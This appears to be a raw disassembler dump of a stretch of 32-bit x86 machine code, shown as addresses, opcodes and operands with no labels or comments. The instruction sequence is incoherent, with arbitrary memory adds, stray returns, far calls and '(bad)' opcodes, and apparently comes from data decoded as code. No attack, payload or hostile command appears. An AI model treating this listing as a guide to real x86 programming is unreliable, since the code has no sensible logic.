  40274b:	add    BYTE PTR [eax+ecx*1],cl
  40274e:	cmp    al,0x34
  402750:	sbb    BYTE PTR [edx+0x1a105424],0x3
  402757:	add    BYTE PTR [edx+0x50],al
  40275a:	push   ebp
  40275b:	inc    esi
  40275c:	push   ecx
  40275d:	and    BYTE PTR [eax+eax*1+0x200200a],cl
  402764:	ret    
  402765:	cdq    
  402766:	add    BYTE PTR [eax+0x4a],dl
  402769:	and    al,BYTE PTR [eax+0x40]
  40276c:	add    DWORD PTR [eax-0x80],eax
  40276f:	inc    esp
  402770:	test   BYTE PTR [edx+ecx*8],dl
  402773:	add    BYTE PTR [eax],ah
  402775:	add    DWORD PTR [ecx+0x1a080],esp
  40277b:	or     edi,edi
  40277d:	adc    eax,0x414e60
  402782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402783:	mov    WORD PTR [ebx],es
  402785:	dec    edx
  402786:	adc    ah,BYTE PTR [edx]
  402788:	and    BYTE PTR [edx+0x0],al
  40278b:	add    al,0x98
  40278d:	or     BYTE PTR [ecx+eax*4],dl
  402790:	or     ah,BYTE PTR [ecx]
  402792:	inc    ecx
  402793:	add    BYTE PTR [ebx],al
  402795:	adc    BYTE PTR [ecx+ecx*1],dh
  402798:	mov    eax,ds:0x20c80041
  40279d:	pop    edx
  40279e:	pop    ebp
  40279f:	push   edx
  4027a0:	add    al,0x60
  4027a2:	mov    BYTE PTR [ecx+ebp*8],cl
  4027a5:	or     BYTE PTR [eax+0x6],0x8c
  4027a9:	add    BYTE PTR [eax],0x39
  4027ac:	inc    eax
  4027ad:	and    DWORD PTR [edx],edx
  4027af:	add    BYTE PTR [ecx],al
  4027b1:	add    ebp,DWORD PTR [ebx+0x16000222]
  4027b7:	mov    ecx,DWORD PTR [edx]
  4027b9:	add    BYTE PTR [ecx+0xc],bl
  4027bc:	inc    ebx
  4027bd:	dec    eax
  4027be:	and    eax,0x18a200e0
  4027c3:	push   es
  4027c4:	retf   0xf092
  4027c7:	add    BYTE PTR [edx+0x44],cl
  4027ca:	add    BYTE PTR [eax],al
  4027cc:	and    BYTE PTR [ebx+0xfc18000],dl
  4027d2:	add    DWORD PTR [eax],edx
  4027d4:	inc    esp
  4027d5:	adc    DWORD PTR [eax],eax
  4027d7:	nop
  4027d8:	adc    BYTE PTR [ecx+ebp*2-0x3f],dl
  4027dc:	mov    eax,ds:0x40040008
  4027e1:	repnz mov al,ds:0xc0841b32
  4027e7:	add    eax,ecx
  4027e9:	add    ebp,DWORD PTR [ebx+edx*1]
  4027ec:	adc    BYTE PTR [ecx],dl
  4027ee:	adc    BYTE PTR [eax],al
  4027f0:	rcl    BYTE PTR es:[eax],0x0
  4027f4:	add    BYTE PTR [edi],ah
  4027f6:	mov    dh,0x20
  4027f8:	mov    esp,0x211c9060
  4027fd:	sbb    BYTE PTR [ebp+0x60180484],bl
  402803:	adc    ah,BYTE PTR [eax]
  402805:	add    al,0x0
  402807:	add    DWORD PTR [eax+0x20],eax
  40280a:	or     DWORD PTR [edi+eax*1],0x428002
  402811:	adc    BYTE PTR [eax],cl
  402813:	mov    ah,0x10
  402815:	add    al,ah
  402817:	mov    ds:0x40210100,eax
  40281c:	sbb    DWORD PTR [edx],edx
  40281e:	add    BYTE PTR [eax],ch
  402820:	add    BYTE PTR [ecx],al
  402822:	add    BYTE PTR [ecx+0x48],al
  402825:	xor    al,0x40
  402827:	mov    eax,ds:0x94310133
  40282c:	inc    edx
  40282d:	ret    0x0
  402830:	add    BYTE PTR [edx],al
  402832:	or     BYTE PTR [ecx+0xdb8c402],dl
  402838:	and    dh,cl
  40283a:	nop
  40283b:	or     BYTE PTR [eax+0x41],al
  40283e:	adc    DWORD PTR [ebp+0x480853a9],esp
  402844:	add    cl,cl
  402846:	inc    eax
  402847:	test   BYTE PTR [ebp+0x400cc2],dl
  40284d:	adc    BYTE PTR [esi],al
  40284f:	cmp    esp,DWORD PTR [eax]
  402851:	add    al,0x26
  402853:	or     BYTE PTR [edx],al
  402855:	or     DWORD PTR [ebx],eax
  402857:	inc    ax
  402859:	add    ah,BYTE PTR [edx+eax*1]
  40285c:	and    eax,0x4254002c
  402861:	add    BYTE PTR [eax],ah
  402863:	sub    al,0xa0
  402865:	xchg   ebx,eax
  402866:	sbb    al,0x10
  402868:	push   eax
  402869:	add    BYTE PTR [ebx+0x14],cl
  40286c:	add    BYTE PTR [edx],0xa
  40286f:	shl    BYTE PTR [edx-0x20],0x4
  402873:	add    BYTE PTR [eax+0x11],ah
  402876:	dec    edi
  402877:	sub    al,BYTE PTR [esi]
  402879:	xor    al,ah
  40287b:	add    BYTE PTR [edx+0x0],bl
  40287e:	add    BYTE PTR [edx+ebp*4-0x5f77f580],ah
  402885:	add    BYTE PTR [edx+edx*1-0x4df3a0ff],ch
  40288c:	add    BYTE PTR [edx+ebx*1],dl
  40288f:	add    BYTE PTR [ecx+0x0],ch
  402892:	add    cl,BYTE PTR [eax]
  402894:	or     DWORD PTR [ecx+0x30806862],eax
  40289a:	or     BYTE PTR [edx-0x3f67faee],dl
  4028a0:	pop    edx
  4028a1:	rol    ah,0xd
  4028a4:	or     DWORD PTR [ecx+ebp*2],edx
  4028a7:	inc    esp
  4028a8:	add    BYTE PTR [ebp-0x5fdbe5d7],ah
  4028ae:	arpl   WORD PTR [eax],sp
  4028b0:	adc    BYTE PTR [ebp-0x6f],al
  4028b3:	xchg   edx,eax
  4028b4:	add    DWORD PTR [edx+0x1],esi
  4028b7:	add    DWORD PTR [ebp+0x43218a14],eax
  4028bd:	inc    edx
  4028be:	jns    0x4028e1
  4028c0:	add    BYTE PTR [edx],0x0
  4028c3:	daa    
  4028c4:	inc    eax
  4028c5:	adc    BYTE PTR [eax+0x831c882],dl
  4028cb:	inc    eax
  4028cc:	sub    al,0x1
  4028ce:	adc    DWORD PTR [eax],0x10
  4028d1:	push   0x4820070
  4028d6:	sbb    eax,0x11d00000
  4028db:	adc    BYTE PTR [edx+0x9],al
  4028de:	loope  0x402940
  4028e0:	dec    esp
  4028e1:	add    al,0x94
  4028e3:	inc    ecx
  4028e4:	and    BYTE PTR [ecx+0x101a1],al
  4028ea:	add    DWORD PTR ds:0x538a00a0,esp
  4028f0:	lds    eax,FWORD PTR [bx+si]
  4028f3:	and    DWORD PTR [ecx+ebp*1],esp
  4028f6:	mov    BYTE PTR [eax],ah
  4028f8:	sub    dl,bl
  4028fa:	inc    eax
  4028fb:	or     BYTE PTR [ecx],ah
  4028fd:	cmp    BYTE PTR [edx+0x40],cl
  402900:	adc    eax,DWORD PTR [edx+0x5]
  402903:	add    BYTE PTR [eax+eiz*1],ah
  402906:	dec    edx
  402907:	pop    ecx
  402908:	adc    BYTE PTR [esi],0xc8
  40290b:	sbb    ecx,DWORD PTR [eax]
  40290d:	and    eax,0xa106c01
  402912:	or     BYTE PTR [eax],dl
  402914:	adc    BYTE PTR [eax+eax*1],al
  402917:	add    eax,DWORD PTR [edx+0x60f581]
  40291d:	or     eax,0x71a2002
  402922:	push   0x22800004
  402927:	add    BYTE PTR [edx],al
  402929:	add    BYTE PTR [eax+eax*2+0x1931412a],al
  402930:	sbb    BYTE PTR [ecx],cl
  402932:	test   al,0x1
  402934:	add    BYTE PTR [eax+0xe],al
  402937:	rol    BYTE PTR [edi],0x45
  40293a:	adc    DWORD PTR [edx+0x610d65c9],ecx
  402940:	xchg   edx,eax
  402941:	jae    0x4028e5
  402943:	and    dl,BYTE PTR [eax-0x1f]
  402946:	add    eax,0x88e00982
  40294b:	add    BYTE PTR [eax+0x54538826],al
  402951:	test   BYTE PTR gs:[eax+0x445c4288],ah
  402958:	mov    al,0x19
  40295a:	adc    BYTE PTR [eax+edx*4],0x9
  40295e:	add    edx,DWORD PTR [ecx+0xe100aa3]
  402964:	or     BYTE PTR [ebx],bl
  402966:	add    BYTE PTR [edx],al
  402968:	or     BYTE PTR [eax-0x7fb3f7f0],al
  40296e:	add    eax,0x4050008
  402973:	inc    ecx
  402974:	adc    BYTE PTR [eax],al
  402976:	add    ebp,DWORD PTR [eax]
  402978:	mov    bl,0x2
  40297a:	dec    ebx
  40297b:	or     BYTE PTR [eax+0x9],dl
  40297e:	nop
  40297f:	sbb    dl,BYTE PTR [ecx]
  402981:	bound  ecx,QWORD PTR [eax+0x42]
  402984:	inc    eax
  402985:	inc    eax
  402986:	sub    ebp,eax
  402988:	adc    BYTE PTR [ecx],dl
  40298a:	loope  0x40292c
  40298c:	and    al,0x80
  40298e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40298f:	mov    ds:0x490012c8,al
  402994:	adc    cl,BYTE PTR [ebx]
  402996:	xor    eax,0x18000a80
  40299b:	add    al,0x68
  40299d:	add    DWORD PTR [eax+eax*1+0x10a7310],eax
  4029a4:	adc    DWORD PTR [eax],ebp
  4029a6:	add    al,BYTE PTR [eax+0xca12012]
  4029ac:	add    BYTE PTR [edx+0xc002812],al
  4029b2:	or     DWORD PTR [eax],eax
  4029b4:	inc    ebx
  4029b5:	sub    BYTE PTR [eax],bl
  4029b7:	or     DWORD PTR [ebx+0x4],0x20100a80
  4029be:	add    BYTE PTR [eax],al
  4029c0:	sbb    dl,BYTE PTR [eax]
  4029c2:	push   es
  4029c3:	add    al,0xc3
  4029c5:	inc    ecx
  4029c6:	sub    BYTE PTR [eax+0x36450a0],ah
  4029cc:	dec    ecx
  4029cd:	push   eax
  4029ce:	add    BYTE PTR [eax+eax*1+0xd04182],al
  4029d5:	inc    ebx
  4029d6:	rol    BYTE PTR [eax],0x8
  4029d9:	add    BYTE PTR [edx],al
  4029db:	adc    eax,DWORD PTR [edx+0x25002212]
  4029e1:	and    BYTE PTR [ecx],0x10
  4029e4:	push   eax
  4029e5:	add    dl,BYTE PTR [edi+0x64466304]
  4029eb:	add    BYTE PTR [eax+0xc],0x14
  4029ef:	or     BYTE PTR [eax],0x4
  4029f2:	sub    BYTE PTR [eax],al
  4029f4:	and    DWORD PTR [eax],eax
  4029f6:	add    BYTE PTR [edx+0x1808a01a],al
  4029fc:	add    bh,BYTE PTR [ecx+0x4c0100]
  402a02:	add    al,dh
  402a04:	sbb    DWORD PTR [edx],ecx
  402a06:	add    BYTE PTR [ebx],al
  402a08:	and    BYTE PTR [eax+0x4914100a],cl
  402a0e:	push   ss
  402a0f:	add    BYTE PTR [ebp-0x76],bl
  402a12:	inc    ebp
  402a13:	xor    BYTE PTR [edx+0x0],al
  402a16:	mov    DWORD PTR [eax+0x52444582],edx
  402a1c:	add    BYTE PTR [esp+ecx*4],al
  402a1f:	inc    ebx
  402a20:	sbb    BYTE PTR [eax],0x10
  402a23:	or     ebp,DWORD PTR [edi]
  402a25:	inc    eax
  402a26:	inc    esp
  402a27:	add    cl,BYTE PTR [ecx+0xa]
  402a2a:	mov    ebx,edx
  402a2c:	popa   
  402a2d:	add    DWORD PTR [eax],esp
  402a2f:	and    BYTE PTR [edx+0x24],ah
  402a32:	test   DWORD PTR [ebx],eax
  402a34:	add    al,dh
  402a36:	add    al,BYTE PTR [eax]
  402a38:	add    eax,DWORD PTR [ecx]
  402a3a:	and    BYTE PTR [edi],al
  402a3c:	add    BYTE PTR [edx+eax*8+0x20],cl
  402a40:	add    edx,ebp
  402a42:	int3   
  402a43:	mov    al,0xc1
  402a45:	mov    ds:0x25124b2,al
  402a4a:	sbb    al,0x1
  402a4c:	add    al,BYTE PTR [ebx]
  402a4e:	or     BYTE PTR [esi+0x48],0x0
  402a52:	adc    al,0x5
  402a54:	add    dl,BYTE PTR [ebp+edi*2+0x18330]
  402a5b:	sub    al,0x3
  402a5d:	push   esp
  402a5e:	inc    eax
  402a5f:	add    BYTE PTR [eax],cl
  402a61:	(bad)  
  402a62:	inc    esi
  402a63:	and    BYTE PTR [esi-0x2deffa10],al
  402a69:	inc    eax
  402a6a:	sub    dl,BYTE PTR [ebx]
  402a6c:	adc    al,al
  402a6e:	or     al,cl
  402a70:	inc    edx
  402a71:	push   0xaa203444
  402a76:	xor    DWORD PTR [edx],0x1010c049
  402a7c:	add    DWORD PTR [edx+0x208a4000],eax
  402a82:	adc    BYTE PTR [eax],al
  402a84:	push   edx
  402a85:	pop    ss
  402a86:	add    eax,DWORD PTR [ebx]
  402a88:	call   0x2002:0x81044860
  402a8f:	add    BYTE PTR [ecx+0x37],bh
  402a92:	push   cs
  402a93:	sub    BYTE PTR [esi],al
  402a95:	or     BYTE PTR [eax],0x88
  402a98:	and    DWORD PTR [edx+eax*1],eax
  402a9b:	and    BYTE PTR [edx+0x11],al
  402a9e:	adc    BYTE PTR [ecx-0x80],al
  402aa1:	adc    BYTE PTR [edx],dh
  402aa3:	add    BYTE PTR [edx-0x72692a22],0x24
  402aaa:	and    BYTE PTR [ebx],dl
  402aac:	dec    eax
  402aad:	xor    BYTE PTR [eax],dl
  402aaf:	adc    eax,0xa00151e
  402ab4:	adc    BYTE PTR [edx],0x0
  402ab7:	or     DWORD PTR [edx],esp
  402ab9:	and    BYTE PTR [eax],al
  402abb:	and    DWORD PTR [ebx],0x302d0008
  402ac1:	sub    BYTE PTR [eax],al
  402ac3:	mov    cl,0xf0
  402ac5:	xor    BYTE PTR [eax],al
  402ac7:	mov    ds:0x551436,al
  402acc:	add    eax,0x4c7328a0
  402ad1:	and    BYTE PTR [ecx],al
  402ad3:	mov    al,ds:0x40c00400
  402ad8:	add    BYTE PTR [edx+eax*1+0x1801001],0x50
  402ae0:	push   eax
  402ae1:	add    dl,BYTE PTR [esp+eiz*4]
  402ae4:	adc    al,0x2
  402ae6:	add    DWORD PTR [eax],0xa0401a82
  402aec:	add    dl,al
  402aee:	or     al,0x80
  402af0:	add    dl,BYTE PTR [eax]
  402af2:	sub    BYTE PTR [edx+eax*1],ah
  402af5:	and    al,0x1
  402af7:	add    DWORD PTR [edx],eax
  402af9:	pusha  
  402afa:	mov    esp,DWORD PTR [eax+0x28080890]
  402b00:	dec    eax
  402b01:	xchg   ecx,eax
  402b02:	sbb    al,0x24
  402b04:	add    eax,0x404004
  402b09:	add    DWORD PTR [eax+0x8],eax
  402b0c:	push   ss
  402b0d:	and    BYTE PTR [eax+0x46],al
  402b10:	sub    BYTE PTR [esp+edx*8+0x2],al
  402b14:	sbb    al,0x42
  402b16:	add    BYTE PTR [eax],dl
  402b18:	add    eax,DWORD PTR [eax-0x2c]
  402b1b:	test   DWORD PTR [edi+0x14],eax
  402b1e:	or     al,al
  402b20:	dec    edx
  402b21:	mov    al,ds:0x2402420
  402b26:	add    BYTE PTR [eax],ch
  402b28:	adc    dl,BYTE PTR [ecx]
  402b2a:	test   ah,ah
  402b2c:	ror    BYTE PTR [ecx],0xa2
  402b2f:	adc    al,0x2
  402b31:	retf   0xc102
  402b34:	adc    al,0x41
  402b36:	push   ss
  402b37:	inc    edx
  402b38:	sbb    BYTE PTR [edi+0x2000800],dl
  402b3e:	lock add BYTE PTR [eax-0x80],al
  402b42:	or     BYTE PTR [eax+eax*1],ah
  402b45:	add    BYTE PTR [ebx],dl
  402b47:	or     BYTE PTR [edi],al
  402b49:	inc    edx
  402b4a:	inc    eax
  402b4b:	dec    eax
  402b4c:	(bad)  
  402b4d:	cmp    BYTE PTR [eax+eax*1],bh
  402b50:	cmp    al,0xa
  402b52:	or     BYTE PTR [edx],al
  402b54:	add    BYTE PTR cs:[eax],cl
  402b57:	adc    BYTE PTR [eax],0xa8
  402b5a:	inc    eax
  402b5b:	xor    BYTE PTR [ecx+0xc],dl
  402b5e:	adc    al,0x2c
  402b60:	add    eax,DWORD PTR es:[eax]
  402b63:	lea    eax,[ebx]
  402b65:	adc    al,BYTE PTR [eax]
  402b67:	add    bl,BYTE PTR [ecx+0x5115608]
  402b6d:	push   eax
  402b6e:	pop    edx
  402b6f:	add    eax,DWORD PTR [eax]
  402b71:	add    DWORD PTR [ebx-0xf9ffd80],eax
  402b77:	inc    ebx
  402b78:	pusha  
  402b79:	add    BYTE PTR [edx],cl
  402b7b:	xchg   DWORD PTR [ecx+0x2],eax
  402b7e:	and    al,0x20
  402b80:	mov    DWORD PTR [eax-0x68],ecx
  402b83:	inc    eax
  402b84:	adc    dl,BYTE PTR [eax]
  402b86:	pusha  
  402b87:	or     BYTE PTR [ebp+0x200a046],ch
  402b8d:	xor    BYTE PTR [ebx+0x15406004],ah
  402b93:	add    BYTE PTR [ecx],al
  402b95:	lea    edx,[eax]
  402b97:	adc    BYTE PTR [eax],al
  402b99:	add    BYTE PTR [eax],al
  402b9b:	or     ah,BYTE PTR [ebx+0x4004d20]
  402ba1:	and    BYTE PTR [eax-0x78f3c6e0],al
  402ba7:	rcl    BYTE PTR [ecx+eax*8],1
  402baa:	or     BYTE PTR [eax+0x300c1021],dl
  402bb0:	and    ah,BYTE PTR [eax-0x3fb5fe7e]
  402bb6:	add    BYTE PTR [edi-0x3c],al
  402bb9:	inc    eax
  402bba:	loopne 0x402bbd
  402bbc:	push   es
  402bbd:	inc    ecx
  402bbe:	add    BYTE PTR [edx],0x44
  402bc1:	inc    esp
  402bc2:	dec    edx
  402bc3:	adc    ah,BYTE PTR [ebx+0xa08090c]
  402bc9:	add    BYTE PTR [edx+ecx*1],ah
  402bcc:	dec    ebp
  402bcd:	add    BYTE PTR [ebx+0x8],al
  402bd0:	add    al,BYTE PTR [ebp+0x18800c0]
  402bd6:	xor    ah,BYTE PTR [edx]
  402bd8:	and    eax,0x20c294
  402bdd:	pushf  
  402bde:	or     al,0x0
  402be0:	and    DWORD PTR [ecx],ebp
  402be2:	sahf   
  402be3:	add    al,BYTE PTR [eax]
  402be5:	adc    esp,DWORD PTR [eax+0x41]
  402be8:	add    BYTE PTR [eax+0x1249d40],bh
  402bee:	test   BYTE PTR [eax+0x34382584],al
  402bf4:	add    al,0x40
  402bf6:	dec    ecx
  402bf7:	mov    dl,0x83
  402bf9:	or     eax,0xf222704
  402bfe:	and    edx,eax
  402c00:	or     bh,BYTE PTR ds:0x52e91114
  402c06:	test   BYTE PTR [eax],al
  402c08:	inc    edx
  402c09:	sbb    eax,0x10902308
  402c0e:	inc    eax
  402c0f:	or     DWORD PTR [eax],ecx
  402c11:	push   es
  402c12:	sbb    BYTE PTR [esi],al
  402c14:	add    DWORD PTR [esi+0x60080126],eax
  402c1a:	and    BYTE PTR [ecx+0x124c3220],0xa5
  402c21:	out    0x38,eax
  402c23:	inc    eax
  402c24:	and    cl,BYTE PTR [eax-0x7b]
  402c27:	call   0xd0e0:0x82000200
  402c2e:	add    BYTE PTR [ecx],al
  402c30:	sar    BYTE PTR [eax+0x0],1
  402c33:	sbb    al,0x8
  402c35:	adc    BYTE PTR [eax],al
  402c37:	cwde   
  402c38:	or     BYTE PTR [edx],al
  402c3a:	inc    edx
  402c3b:	or     dl,BYTE PTR [ebx+0x11]
  402c3e:	add    BYTE PTR [esi-0x80],ch
  402c41:	or     dl,BYTE PTR ds:0x84fb300
  402c47:	or     ch,BYTE PTR [ebp+0x14]
  402c4a:	add    DWORD PTR [ebx],0x0
  402c4d:	and    dl,BYTE PTR [eax]
  402c4f:	mov    eax,ds:0x92008820
  402c54:	ins    BYTE PTR es:[edi],dx
  402c55:	inc    edx
  402c56:	add    ah,BYTE PTR [eax+0x20]
  402c59:	inc    edx
  402c5a:	xchg   ecx,eax
  402c5b:	push   0x18522246
  402c60:	rol    BYTE PTR [esp+eax*1+0x41],0x18
  402c65:	sbb    BYTE PTR [edx-0x5faedfac],0x14
  402c6c:	adc    BYTE PTR [edx+ecx*1],bl
  402c6f:	pop    ss
  402c70:	add    BYTE PTR [edx*1+0x1007602],al
  402c77:	add    ah,BYTE PTR [eax]
  402c79:	adc    dl,BYTE PTR [ecx]
  402c7b:	inc    ebx
  402c7c:	adc    DWORD PTR [ecx+esi*1],ecx
  402c7f:	add    BYTE PTR [ebp+0xe],0x10
  402c83:	push   es
  402c84:	dec    esi
  402c85:	ret    
  402c86:	and    DWORD PTR [edx],ebx
  402c88:	add    BYTE PTR [edx+eax*1-0x5f7dc278],dl
  402c8f:	inc    esp
  402c90:	add    DWORD PTR [eax],esp
  402c92:	xor    ch,BYTE PTR [ebp+0x2118479]
  402c98:	mov    ds:0x86280909,eax
  402c9d:	push   es
  402c9e:	add    BYTE PTR [ecx+0x11441184],dl
  402ca4:	pusha  
  402ca5:	inc    ecx
  402ca6:	xor    BYTE PTR [eax-0x7d5d6b3a],al
  402cac:	inc    eax
  402cad:	add    al,0x13
  402caf:	add    BYTE PTR [ecx-0x7d27ffcf],ah
  402cb5:	ret    0x8020
  402cb8:	nop
  402cb9:	and    BYTE PTR [ebx],dl
  402cbb:	or     eax,0x3118c280
  402cc0:	ror    BYTE PTR [ebx+0x4140836],1
  402cc6:	and    BYTE PTR [eax+ebp*4+0x10180804],ah
  402ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cce:	mov    BYTE PTR [ecx],dl
  402cd0:	adc    BYTE PTR [edx+0x42040044],dh
  402cd6:	inc    eax
  402cd7:	sbb    BYTE PTR [ebx],ah
  402cd9:	push   edx
  402cda:	add    eax,0x38140364
  402cdf:	adc    BYTE PTR [eax],al
  402ce1:	add    DWORD PTR [eax],edx
  402ce3:	or     BYTE PTR [esi],al
  402ce5:	add    al,0x0
  402ce7:	nop
  402ce8:	adc    BYTE PTR [edx+0x2],dl
  402ceb:	add    edx,DWORD PTR [eax]
  402ced:	test   BYTE PTR [eax],dl
  402cef:	sub    BYTE PTR [eax+0xa24a290],dl
  402cf5:	pusha  
  402cf6:	or     ecx,DWORD PTR [ecx]
  402cf8:	add    edx,edx
  402cfa:	or     BYTE PTR [eax],ah
  402cfc:	adc    al,0x0
  402cfe:	push   eax
  402cff:	mov    eax,0x401901c0
  402d04:	add    cl,BYTE PTR [eax]
  402d06:	push   es
  402d07:	and    BYTE PTR [edx],al
  402d09:	and    BYTE PTR [esp+eax*8+0x41],al
  402d0d:	add    al,BYTE PTR [edx+0x305006c]
  402d13:	add    BYTE PTR [eax],dh
  402d15:	and    BYTE PTR [edx+0x0],al
  402d18:	add    BYTE PTR [ebx+0x48110040],dl
  402d1e:	sbb    ch,BYTE PTR [eax]
  402d20:	inc    ecx
  402d21:	add    DWORD PTR [ebx+0x18],esi
  402d24:	add    BYTE PTR [edi+0x12],al
  402d27:	adc    al,BYTE PTR [eax]
  402d29:	or     BYTE PTR [eax+0x20],bl
  402d2c:	and    cl,BYTE PTR [ecx+eax*1]
  402d2f:	add    DWORD PTR [ecx],esp
  402d31:	inc    esp
  402d32:	inc    esp
  402d33:	inc    eax
  402d34:	or     eax,0x6189011
  402d39:	or     BYTE PTR [ebx+esi*4+0x12],al
  402d3d:	add    al,cl
  402d3f:	jo     0x402d55
  402d41:	adc    al,0x24
  402d43:	and    DWORD PTR [eax+0x68],eax
  402d46:	inc    esp
  402d47:	add    BYTE PTR [eax+eiz*1],dl
  402d4a:	adc    BYTE PTR [eax],dh
  402d4c:	add    BYTE PTR [ecx+eax*1],al
  402d4f:	and    dl,BYTE PTR [eax]
  402d51:	add    BYTE PTR [ecx+0xa510a41],0x0
  402d58:	adc    BYTE PTR [edx],ah
  402d5a:	and    eax,0x560c0028
  402d5f:	sub    BYTE PTR [ecx],ah
  402d61:	mov    al,ds:0x2500002
  402d66:	nop
  402d67:	add    al,0x24
  402d69:	add    al,0x0
  402d6b:	push   es
  402d6c:	inc    eax
  402d6d:	adc    BYTE PTR [eax+0x69],bl
  402d70:	ret    0x638c
  402d73:	inc    ecx
  402d74:	pop    ecx
  402d75:	add    al,0x1
  402d77:	add    al,BYTE PTR ds:0x4750e222
  402d7d:	add    BYTE PTR [esi+eax*2],al
  402d80:	add    al,BYTE PTR [ecx]
  402d82:	push   cs
  402d83:	mov    al,0x2
  402d85:	sbb    BYTE PTR [edx+0x2],ah
  402d88:	add    DWORD PTR [ecx],esp
  402d8a:	add    BYTE PTR [edx+0xa],al
  402d8d:	sbb    dl,BYTE PTR [eax]
  402d8f:	bound  esp,QWORD PTR [eax+esi*1+0x31]
  402d93:	sbb    eax,DWORD PTR [edx]
  402d95:	push   cs
  402d96:	xor    BYTE PTR [ebp+0x85c02],al
  402d9c:	pusha  
  402d9d:	add    BYTE PTR [eax],ah
  402d9f:	mov    ds:0x18508,eax
  402da4:	test   DWORD PTR [eax+ebp*1],eax
  402da7:	mov    bh,0x34
  402da9:	adc    BYTE PTR [ebx],ah
  402dab:	or     al,0x10
  402dad:	test   DWORD PTR [esi],edx
  402daf:	test   BYTE PTR [esp],dh
  402db2:	or     DWORD PTR [esi-0x80],eax
  402db5:	adc    ecx,DWORD PTR [eax+edx*2]
  402db8:	mov    al,ds:0x4080428
  402dbd:	adc    al,0x20
  402dbf:	push   ss
  402dc0:	add    esp,DWORD PTR [ebx]
  402dc2:	xor    eax,DWORD PTR [eax]
  402dc4:	add    BYTE PTR [eax-0x64bfffdf],ah
  402dca:	sbb    DWORD PTR [ecx],0x22
  402dcd:	inc    esp
  402dce:	and    DWORD PTR [eax],edx
  402dd0:	add    DWORD PTR [eax],eax
  402dd2:	test   BYTE PTR [edx],cl
  402dd4:	loopne 0x402dda
  402dd6:	inc    eax
  402dd7:	and    al,0x41
  402dd9:	repnz add ah,BYTE PTR [edx-0x3f7fdf5c]
  402de0:	sub    al,0x88
  402de2:	add    BYTE PTR [eax],ah
  402de4:	and    ah,BYTE PTR [eax]
  402de6:	xor    al,0x45
  402de8:	or     cl,BYTE PTR [eax]
  402dea:	pusha  
  402deb:	and    DWORD PTR [eax-0x76],edx
  402dee:	sub    al,ch
  402df0:	dec    eax
  402df1:	mov    ecx,0xa92e023
  402df6:	add    BYTE PTR [eax],0xb0
  402df9:	imul   esp,DWORD PTR [ecx-0x7f],0x802000
  402e00:	add    BYTE PTR [edx],al
  402e02:	inc    esp
  402e03:	add    edx,ecx
  402e05:	inc    eax
  402e06:	add    ch,0x60
  402e09:	pop    es
  402e0a:	add    BYTE PTR [ecx+eax*4+0x10],dh
  402e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e0f:	xor    al,BYTE PTR [edx+0x3410008]
  402e15:	mov    ds:0x904200b6,al
  402e1a:	inc    edx
  402e1b:	xor    DWORD PTR [edx],eax
  402e1d:	sbb    BYTE PTR ds:0x14025a4a,0x80
  402e24:	add    DWORD PTR [eax-0x7f],eax
  402e27:	mov    BYTE PTR [eax+0x30],0x44
  402e2b:	xchg   ecx,eax
  402e2c:	inc    edx
  402e2d:	dec    eax
  402e2e:	add    eax,DWORD PTR [eax]
  402e30:	add    eax,0x100058c2
  402e35:	xor    BYTE PTR [eax-0x3e],al
  402e38:	add    BYTE PTR [ecx+0x4],0x8a
  402e3c:	add    ecx,DWORD PTR [eax-0xddfff31]
  402e42:	add    al,BYTE PTR [eax+0x25]
  402e45:	daa    
  402e46:	in     al,0x0
  402e48:	or     al,0x40
  402e4b:	xor    BYTE PTR [eax+0x0],cl
  402e4e:	adc    BYTE PTR [eax],0x4
  402e51:	dec    esp
  402e52:	adc    ah,BYTE PTR [esp+ecx*4-0x78]
  402e56:	add    BYTE PTR ds:0x90041883,bh
  402e5c:	add    al,0x40
  402e5e:	inc    eax
  402e5f:	mov    al,ds:0x91020b11
  402e64:	loopne 0x402eca
  402e66:	add    al,BYTE PTR [eax+0x9040b04]
  402e6c:	inc    eax
  402e6d:	or     eax,0x40411014
  402e72:	push   esp
  402e73:	add    ah,BYTE PTR [ebx+0x1a]
  402e76:	add    cl,BYTE PTR [edx]
  402e78:	adc    BYTE PTR [eax],al
  402e7a:	add    al,0x30
  402e7c:	adc    BYTE PTR [eax],ch
  402e7e:	pushf  
  402e7f:	add    BYTE PTR [edx-0x80],ah
  402e82:	jo     0x402e98
  402e84:	add    BYTE PTR [eax],cl
  402e86:	pusha  
  402e87:	rol    BYTE PTR [eax+0x20630a08],1
  402e8d:	adc    DWORD PTR [eax+0x100080],eax
  402e93:	adc    BYTE PTR [eax],al
  402e95:	or     BYTE PTR [ecx+0x40],dl
  402e98:	push   ds
  402e99:	adc    al,0x0
  402e9b:	sbb    BYTE PTR [eax],al
  402e9d:	dec    edx
  402e9e:	sub    BYTE PTR [eax+0x51],cl
  402ea1:	add    BYTE PTR [ecx+0x18080050],al
  402ea7:	or     BYTE PTR [ebx+0x8],ah
  402eaa:	add    eax,DWORD PTR [eax+0x4e]
  402ead:	or     BYTE PTR ds:0x8000032,al
  402eb3:	add    BYTE PTR [ecx],al
  402eb5:	add    BYTE PTR [eax+ebx*1],0xb0
  402eb9:	add    cl,BYTE PTR [ecx]
  402ebb:	inc    ecx
  402ebc:	add    bl,BYTE PTR [eax]
  402ebe:	push   0x2122020
  402ec3:	sub    al,0x34
  402ec5:	push   edx
  402ec6:	mov    al,0xa
  402ec8:	push   es
  402ec9:	push   es
  402eca:	xor    BYTE PTR [esi],0x0
  402ecd:	push   ecx
  402ece:	and    BYTE PTR [ebx-0x80],ah
  402ed1:	sub    al,BYTE PTR [esp+ebx*1+0x3]
  402ed5:	nop
  402ed6:	nop
  402ed7:	ret    0x9aa4
  402eda:	inc    ecx
  402edb:	push   es
  402edc:	add    al,BYTE PTR [eax]
  402ede:	sub    BYTE PTR [eax+0x1],0x41
  402ee2:	adc    BYTE PTR [edx+0x42],al
  402ee5:	mov    BYTE PTR [edx],dl
  402ee7:	dec    eax
  402ee8:	jne    0x402eb6
  402eea:	add    BYTE PTR [ecx],al
  402eec:	cmp    BYTE PTR [eax],dl
  402eee:	inc    eax
  402eef:	inc    ecx
  402ef0:	add    BYTE PTR [edx+eax*4],al
  402ef3:	add    BYTE PTR [eax],al
  402ef5:	mov    al,ds:0x410410c1
  402efa:	add    DWORD PTR [ecx],eax
  402efc:	rcl    BYTE PTR [eax],0x1
  402eff:	or     DWORD PTR [eax+0x50],0xd998002
